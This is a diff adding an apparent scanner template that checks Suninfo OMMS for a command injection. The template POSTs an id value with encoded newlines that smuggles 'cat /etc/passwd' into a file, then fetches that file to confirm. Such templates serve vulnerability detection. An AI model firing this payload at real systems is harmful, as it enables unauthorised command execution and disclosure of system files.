@@ -1,0 +1,52 @@
+id: poc-yaml-suninfo-ommas-repeatsend-command-injection
+info:
+  name: Suninfo OMMS RepeatSend Command Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+  metadata:
+    finger: Suninfo Operations Maintenance Management System
+
+variables:
+  t1: "{{rand_base(4)}}"
+
+http:
+  - id: step-1
+    method: POST
+    path:
+      - "{{BaseURL}}/emailapply/RepeatSend"
+    headers:
+      Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+    body: |
+      id='%0acat /etc/passwd > {{t1}}.txt%0a'
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "error"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+
+  - id: step-2
+    method: GET
+    path:
+      - "{{BaseURL}}/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+      - type: word
+        part: body
+        words:
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
